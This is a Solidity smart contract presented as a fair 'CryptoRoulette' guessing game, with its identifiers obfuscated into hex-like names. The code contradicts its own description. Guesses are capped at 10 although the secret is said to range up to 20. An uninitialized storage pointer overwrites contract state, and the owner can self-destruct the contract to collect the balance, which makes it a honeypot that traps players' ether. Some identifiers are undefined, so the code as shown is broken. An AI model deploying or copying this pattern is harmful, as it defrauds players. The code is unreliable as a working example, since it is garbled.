// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

// CryptoRoulette
//
// Guess the number secretly stored in the blockchain and win the whole contract balance!
// A new number is randomly chosen after each try.

// To play, call the play() method with the guessed number (1-20).  Bet price: 0.1 ether

contract CryptoRoulette {

    uint256 private _0xc172ce;
    uint256 public _0x287e32;
    uint256 public _0xaa2781 = 0.1 ether;
    address public _0x9d3b48;

    struct Game {
        address _0xf25dbb;
        uint256 number;
    }
    Game[] public _0x1d6418;

    function CryptoRoulette() public {
        _0x9d3b48 = msg.sender;
        _0x4ba6e0();
    }

    function _0x4ba6e0() internal {
        // randomly set secretNumber with a value between 1 and 20
        _0xc172ce = uint8(_0x0228bf(_0xd5bbee, block.blockhash(block.number-1))) % 20 + 1;
    }

    function _0x244d8b(uint256 number) payable public {
        require(msg.value >= _0xaa2781 && number <= 10);
        Game _0x6a8bc9;
        _0x6a8bc9._0xf25dbb = msg.sender;
        _0x6a8bc9.number = number;
        _0x1d6418.push(_0x6a8bc9);

        if (number == _0xc172ce) {
            // win!
            msg.sender.transfer(this.balance);
        }

        _0x4ba6e0();
        _0x287e32 = _0xd5bbee;
    }

    function _0x521579() public {
        if (msg.sender == _0x9d3b48 && _0xd5bbee > _0x287e32 + 1 days) {
            suicide(msg.sender);
        }
    }

    function() public payable { }
}